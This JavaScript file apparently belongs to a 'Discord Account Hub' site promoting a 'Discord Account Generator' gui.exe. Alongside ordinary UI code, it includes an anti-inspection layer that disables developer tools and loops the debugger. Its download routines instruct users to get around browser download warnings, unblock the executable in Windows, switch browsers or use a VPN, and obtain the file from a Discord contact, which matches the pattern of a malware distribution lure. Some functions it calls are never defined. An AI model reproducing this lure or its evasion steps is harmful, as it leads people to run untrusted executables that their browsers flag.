// Protection Layer - Disable common inspection methods
(function() {
    // Disable right-click context menu
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });

    // Disable text selection
    document.addEventListener('selectstart', function(e) {
        e.preventDefault();
        return false;
    });

    // Disable drag and drop
    document.addEventListener('dragstart', function(e) {
        e.preventDefault();
        return false;
    });

    // Disable keyboard shortcuts for developer tools
    document.addEventListener('keydown', function(e) {
        // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
        if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
            e.preventDefault();
            return false;
        }
    });

    // Anti-debugger protection
    setInterval(function() {
        debugger;
    }, 100);

    // Console clearing protection
    const originalConsole = {...console};
    console.clear = function() {
        console.log('Console cleared by protection');
    };

    // Basic obfuscation
    var _0x4b2a = ['api', 'config', 'utils'];
    var _0x5e5f = function(_0x4b2a, _0x5e5f) {
        return _0x4b2a[_0x5e5f];
    };
})();

// Discord Account Hub JavaScript

// Mobile Navigation Toggle
const hamburger = document.querySelector('.hamburger');
const navMenu = document.querySelector('.nav-menu');

hamburger.addEventListener('click', () => {
    hamburger.classList.toggle('active');
    navMenu.classList.toggle('active');
});

// Search Functionality
const searchInput = document.querySelector('.search-bar input');
const searchIcon = document.querySelector('.search-bar i');

searchInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        performSearch(searchInput.value);
    }
});

searchIcon.addEventListener('click', () => {
    performSearch(searchInput.value);
});

function performSearch(query) {
    if (query.trim()) {
        // In a real app, this would search the site
        console.log('Searching for:', query);
        // For demo, show an alert
        showNotification(`Searching for "${query}"...`, 'info');
    }
}

// Notification System
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.innerHTML = `
        <div class="notification-content">
            <i class="fas fa-${getNotificationIcon(type)}"></i>
            <span>${message}</span>
            <button class="notification-close" onclick="this.parentElement.parentElement.remove()">
                <i class="fas fa-times"></i>
            </button>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        if (notification.parentElement) {
            notification.remove();
        }
    }, 5000);
}

function getNotificationIcon(type) {
    const icons = {
        'info': 'info-circle',
        'success': 'check-circle',
        'warning': 'exclamation-triangle',
        'error': 'times-circle'
    };
    return icons[type] || 'info-circle';
}

// Copy to Clipboard Function
function copyToClipboard(text, button) {
    navigator.clipboard.writeText(text).then(() => {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copied!';
        button.classList.add('copied');
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.classList.remove('copied');
        }, 2000);
        
        showNotification('Copied to clipboard!', 'success');
    }).catch(err => {
        showNotification('Failed to copy to clipboard', 'error');
    });
}

// Smooth Scrolling for Navigation Links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// Intersection Observer for Animations
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -50px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.classList.add('animate-in');
        }
    });
}, observerOptions);

// Observe elements for animation
document.addEventListener('DOMContentLoaded', () => {
    const animateElements = document.querySelectorAll('.feature-card, .tool-card, .section-title');
    animateElements.forEach(el => observer.observe(el));
});

// Navbar Scroll Effect
let lastScroll = 0;
const navbar = document.querySelector('.navbar');

window.addEventListener('scroll', () => {
    const currentScroll = window.pageYOffset;
    
    if (currentScroll <= 0) {
        navbar.classList.remove('scroll-up');
        return;
    }
    
    if (currentScroll > lastScroll && !navbar.classList.contains('scroll-down')) {
        navbar.classList.remove('scroll-up');
        navbar.classList.add('scroll-down');
    } else if (currentScroll < lastScroll && navbar.classList.contains('scroll-down')) {
        navbar.classList.remove('scroll-down');
        navbar.classList.add('scroll-up');
    }
    
    lastScroll = currentScroll;
});

// Add CSS for animations and notifications
const style = document.createElement('style');
style.textContent = `
    .notification {
        position: fixed;
        top: 80px;
        right: 20px;
        z-index: 10000;
        animation: slideInRight 0.3s ease;
        max-width: 400px;
    }
    
    .notification-content {
        background: var(--bg-secondary);
        border: 1px solid var(--border-color);
        border-radius: 8px;
        padding: 16px;
        display: flex;
        align-items: center;
        gap: 12px;
        box-shadow: var(--shadow);
    }
    
    .notification-info .notification-content {
        border-left: 4px solid var(--primary-color);
    }
    
    .notification-success .notification-content {
        border-left: 4px solid var(--secondary-color);
    }
    
    .notification-warning .notification-content {
        border-left: 4px solid var(--warning-color);
    }
    
    .notification-error .notification-content {
        border-left: 4px solid var(--danger-color);
    }
    
    .notification-close {
        background: none;
        border: none;
        color: var(--text-muted);
        cursor: pointer;
        padding: 4px;
        margin-left: auto;
    }
    
    .notification-close:hover {
        color: var(--text-primary);
    }
    
    @keyframes slideInRight {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    .animate-in {
        animation: fadeInUp 0.6s ease forwards;
    }
    
    .navbar.scroll-down {
        transform: translateY(-100%);
    }
    
    .navbar.scroll-up {
        transform: translateY(0);
    }
    
    .navbar {
        transition: transform 0.3s ease;
    }
    
    .copied {
        background-color: var(--secondary-color) !important;
        color: var(--bg-primary) !important;
    }
    
    .nav-menu.active {
        display: flex !important;
        position: absolute;
        top: 100%;
        left: 0;
        right: 0;
        background: var(--bg-secondary);
        flex-direction: column;
        padding: 20px;
        border-top: 1px solid var(--border-color);
        box-shadow: var(--shadow);
    }
    
    .hamburger.active span:nth-child(1) {
        transform: rotate(-45deg) translate(-5px, 6px);
    }
    
    .hamburger.active span:nth-child(2) {
        opacity: 0;
    }
    
    .hamburger.active span:nth-child(3) {
        transform: rotate(45deg) translate(-5px, -6px);
    }
    
    @media (max-width: 768px) {
        .notification {
            right: 10px;
            left: 10px;
            max-width: none;
        }
    }
`;

document.head.appendChild(style);

// Tool Functions (for tools page)
function generateUsername() {
    const prefixes = ['Cool', 'Epic', 'Awesome', 'Super', 'Mega', 'Ultra', 'Pro', 'Elite', 'Master', 'Legend'];
    const suffixes = ['Gamer', 'Player', 'Warrior', 'Ninja', 'Hero', 'Champion', 'Expert', 'Master', 'Lord', 'King'];
    const numbers = Math.floor(Math.random() * 9999);
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
    
    return `${prefix}${suffix}${numbers}`;
}

function generateRoleName() {
    const roleTypes = ['Admin', 'Moderator', 'VIP', 'Premium', 'Elite', 'Pro', 'Staff', 'Helper', 'Guard', 'Patrol'];
    const modifiers = ['Super', 'Mega', 'Ultra', 'Pro', 'Elite', 'Master', 'Chief', 'Lead', 'Senior', 'Junior'];
    
    const roleType = roleTypes[Math.floor(Math.random() * roleTypes.length)];
    const modifier = Math.random() > 0.5 ? modifiers[Math.floor(Math.random() * modifiers.length)] + ' ' : '';
    
    return modifier + roleType;
}

// Discord OAuth2 Integration
function loginWithDiscord() {
    // Show login modal
    showDiscordLoginModal();
}

function showDiscordLoginModal() {
    // Create modal if it doesn't exist
    let modal = document.getElementById('discordLoginModal');
    if (!modal) {
        modal = document.createElement('div');
        modal.id = 'discordLoginModal';
        modal.className = 'modal';
        modal.innerHTML = `
            <div class="modal-content">
                <div class="modal-header">
                    <h2>Discord Login</h2>
                    <button class="modal-close" onclick="closeDiscordLoginModal()">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="login-content">
                        <div class="discord-logo-large">
                            <i class="fab fa-discord"></i>
                        </div>
                        <p>Connect your Discord account to access:</p>
                        <ul class="login-features">
                            <li><i class="fas fa-bookmark"></i> Save templates to your account</li>
                            <li><i class="fas fa-history"></i> Track your tool history</li>
                            <li><i class="fas fa-server"></i> Manage your servers</li>
                            <li><i class="fas fa-crown"></i> Unlock premium features</li>
                        </ul>
                        <div class="login-buttons">
                            <button class="btn btn-primary btn-large" onclick="initiateDiscordOAuth()">
                                <i class="fab fa-discord"></i>
                                Login with Discord
                            </button>
                            <button class="btn btn-secondary" onclick="closeDiscordLoginModal()">
                                Cancel
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `;
        document.body.appendChild(modal);
        
        // Add modal styles
        if (!document.getElementById('discordLoginStyles')) {
            const styles = document.createElement('style');
            styles.id = 'discordLoginStyles';
            styles.textContent = `
                .login-content {
                    text-align: center;
                    padding: 20px;
                }
                .discord-logo-large {
                    font-size: 4rem;
                    color: var(--primary-color);
                    margin-bottom: 20px;
                }
                .login-features {
                    list-style: none;
                    padding: 20px 0;
                    margin-bottom: 30px;
                }
                .login-features li {
                    display: flex;
                    align-items: center;
                    gap: 12px;
                    margin-bottom: 12px;
                    color: var(--text-secondary);
                    font-size: 1rem;
                }
                .login-features i {
                    color: var(--primary-color);
                    width: 20px;
                }
                .login-buttons {
                    display: flex;
                    flex-direction: column;
                    gap: 15px;
                    align-items: center;
                }
                .btn-large {
                    padding: 16px 32px;
                    font-size: 1.1rem;
                    min-width: 200px;
                }
            `;
            document.head.appendChild(styles);
        }
    }
    
    // Show modal
    modal.style.display = 'flex';
    
    // Close modal when clicking outside
    modal.onclick = function(event) {
        if (event.target === modal) {
            closeDiscordLoginModal();
        }
    };
}

function closeDiscordLoginModal() {
    const modal = document.getElementById('discordLoginModal');
    if (modal) {
        modal.remove();
    }
}

function initiateDiscordOAuth() {
    // Demo mode - simulate login without real Discord credentials
    // Remove the YOUR_DISCORD_CLIENT_ID requirement for demo purposes
    
    // Show loading state
    const modal = document.getElementById('discordLoginModal');
    const loginBtn = modal.querySelector('.btn-primary');
    
    if (loginBtn) {
        loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
        loginBtn.disabled = true;
    }
    
    // Simulate OAuth process
    setTimeout(() => {
        simulateDiscordLogin();
    }, 1500);
}

function simulateDiscordLogin() {
    // Simulate successful Discord login
    const mockUser = {
        id: '1234567890123456789',
        username: 'DemoUser',
        discriminator: '1234',
        avatar: 'https://cdn.discordapp.com/embed/avatars/0.png',
        email: 'demo@example.com'
    };
    
    // Store user session
    localStorage.setItem('discordUser', JSON.stringify(mockUser));
    localStorage.setItem('isLoggedIn', 'true');
    
    // Update UI
    updateLoginButton(mockUser);
    closeDiscordLoginModal();
    
    showNotification('Successfully logged in as DemoUser#1234! (Demo Mode)', 'success');
    
    // Uncomment this line for real OAuth flow:
    // window.location.href = authUrl;
}

function updateLoginUI(userData) {
    // Update all login buttons across the site
    document.querySelectorAll('.login-btn').forEach(btn => {
        btn.innerHTML = `
            <img src="${userData.avatar}" alt="Avatar" class="user-avatar">
            ${userData.username}#${userData.discriminator}
            <i class="fas fa-chevron-down"></i>
        `;
        btn.onclick = showUserMenu;
        btn.classList.add('logged-in');
    });
}

function showUserMenu(event) {
    event.stopPropagation();
    
    // Remove existing menu
    const existingMenu = document.querySelector('.user-menu');
    if (existingMenu) {
        existingMenu.remove();
        return;
    }
    
    // Create user menu
    const menu = document.createElement('div');
    menu.className = 'user-menu';
    menu.innerHTML = `
        <div class="user-menu-header">
            <img src="${JSON.parse(localStorage.getItem('discordUser')).avatar}" alt="Avatar" class="user-avatar-large">
            <div class="user-info">
                <div class="user-name">${JSON.parse(localStorage.getItem('discordUser')).username}#${JSON.parse(localStorage.getItem('discordUser')).discriminator}</div>
                <div class="user-email">${JSON.parse(localStorage.getItem('discordUser')).email}</div>
            </div>
        </div>
        <div class="user-menu-items">
            <a href="dashboard.html" class="menu-item">
                <i class="fas fa-tachometer-alt"></i>
                Dashboard
            </a>
            <a href="#" class="menu-item" onclick="logout()">
                <i class="fas fa-sign-out-alt"></i>
                Logout
            </a>
        </div>
    `;
    
    // Position menu
    const btn = event.currentTarget;
    const rect = btn.getBoundingClientRect();
    menu.style.position = 'fixed';
    menu.style.top = rect.bottom + 'px';
    menu.style.right = (window.innerWidth - rect.right) + 'px';
    menu.style.zIndex = '10000';
    
    document.body.appendChild(menu);
    
    // Close menu when clicking outside
    setTimeout(() => {
        document.addEventListener('click', closeUserMenu);
    }, 100);
}

function closeUserMenu() {
    const menu = document.querySelector('.user-menu');
    if (menu) {
        menu.remove();
        document.removeEventListener('click', closeUserMenu);
    }
}

function logout() {
    localStorage.removeItem('discordUser');
    localStorage.removeItem('isLoggedIn');
    
    // Reset UI
    document.querySelectorAll('.login-btn').forEach(btn => {
        btn.innerHTML = '<i class="fab fa-discord"></i> Login';
        btn.onclick = loginWithDiscord;
        btn.classList.remove('logged-in');
    });
    
    closeUserMenu();
    showNotification('Successfully logged out', 'success');
}

// Check login status on page load
document.addEventListener('DOMContentLoaded', () => {
    const isLoggedIn = localStorage.getItem('isLoggedIn') === 'true';
    if (isLoggedIn) {
        const userData = JSON.parse(localStorage.getItem('discordUser'));
        updateLoginButton(userData);
    }
});

// Close modals on Escape key
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        closeDiscordLoginModal();
        closeGuideModal();
    }
});

// Discord Account Generator Download
function downloadDiscordGen() {
    // Try multiple download methods
    const exeFileName = 'gui.exe';
    const exeFileUrl = './files/' + exeFileName;
    
    // Method 1: Try direct download
    try {
        const a = document.createElement('a');
        a.href = exeFileUrl;
        a.download = exeFileName;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        
        showNotification('Download attempted! If it doesn\'t work, try the alternative methods below.', 'info');
    } catch (error) {
        showNotification('Direct download failed. Use alternative methods.', 'warning');
    }
}

function copyDownloadLink() {
    const downloadUrl = window.location.origin + '/files/gui.exe';
    
    // Show URL display
    const urlDisplay = document.getElementById('urlDisplay');
    const urlInput = document.getElementById('downloadUrl');
    
    urlDisplay.style.display = 'block';
    urlInput.value = downloadUrl;
    
    // Copy to clipboard
    navigator.clipboard.writeText(downloadUrl).then(() => {
        showNotification('Download URL copied! Paste in browser to download.', 'success');
    }).catch(() => {
        // Fallback for older browsers
        const textArea = document.createElement('textarea');
        textArea.value = downloadUrl;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        
        showNotification('Download URL copied! Paste in browser to download.', 'success');
    });
}

function copyUrlToClipboard() {
    const urlInput = document.getElementById('downloadUrl');
    urlInput.select();
    document.execCommand('copy');
    showNotification('URL copied again!', 'info');
}

function downloadTextFile() {
    const downloadUrl = window.location.origin + '/files/gui.exe';
    const instructions = `DISCORD GENERATOR DOWNLOAD INSTRUCTIONS
========================================

If Chrome/Edge is blocking the download, follow these steps:

DIRECT DOWNLOAD LINK:
${downloadUrl}

STEP-BY-STEP INSTRUCTIONS:
1. Copy the URL above
2. Open a NEW browser tab (not incognito)
3. Paste the URL and press Enter
4. When download starts, right-click and "Save link as"
5. Save the file as "gui.exe"

AFTER DOWNLOAD:
6. Right-click the downloaded gui.exe file
7. Select "Properties"
8. Check "Unblock" at the bottom
9. Click "Apply" then "OK"
10. Double-click to run

ALTERNATIVE METHODS:
- Use Firefox browser instead of Chrome/Edge
- Try downloading on mobile device
- Use a VPN and try again
- Scroll to bottom of page to add me on Discord (nyx.r4c) for direct file

FILE INFO:
- Name: gui.exe
- Size: 13.5 MB
- Type: Windows Executable
- Safe: Yes (this is your original file)

DISCORD SUPPORT:
- Username: nyx.r4c
- Scroll to bottom of page and click "Add me on Discord"
- I can send you the file directly through Discord

Created: ${new Date().toLocaleString()}
Website: Discord Account Hub
========================================`;

    // Create and download the text file
    const blob = new Blob([instructions], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    
    const a = document.createElement('a');
    a.href = url;
    a.download = 'DOWNLOAD_INSTRUCTIONS.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    
    window.URL.revokeObjectURL(url);
    
    showNotification('Instructions file downloaded! Open it and follow the steps.', 'success');
}

function copyDiscordId() {
    const discordUsername = 'nyx.r4c';
    
    // Copy to clipboard
    navigator.clipboard.writeText(discordUsername).then(() => {
        showNotification('Discord username copied! Add me: nyx.r4c', 'success');
    }).catch(() => {
        // Fallback for older browsers
        const textArea = document.createElement('textarea');
        textArea.value = discordUsername;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        
        showNotification('Discord username copied! Add me: nyx.r4c', 'success');
    });
    
    // Also show the username in an alert for visibility
    setTimeout(() => {
        alert(`Discord username copied to clipboard!\n\nUsername: nyx.r4c\n\nPaste this in Discord's search bar to find and add me.`);
    }, 500);
}

// Initialize on page load
document.addEventListener('DOMContentLoaded', () => {
    // Add loading animation
    document.body.classList.add('loaded');
    
    // Initialize tooltips
    const tooltips = document.querySelectorAll('[data-tooltip]');
    tooltips.forEach(tooltip => {
        tooltip.addEventListener('mouseenter', (e) => {
            const tooltipText = e.target.getAttribute('data-tooltip');
            const tooltipElement = document.createElement('div');
            tooltipElement.className = 'tooltip';
            tooltipElement.textContent = tooltipText;
            document.body.appendChild(tooltipElement);
            
            const rect = e.target.getBoundingClientRect();
            tooltipElement.style.left = rect.left + (rect.width / 2) - (tooltipElement.offsetWidth / 2) + 'px';
            tooltipElement.style.top = rect.top - tooltipElement.offsetHeight - 10 + 'px';
        });
        
        tooltip.addEventListener('mouseleave', () => {
            const tooltip = document.querySelector('.tooltip');
            if (tooltip) tooltip.remove();
        });
    });
});
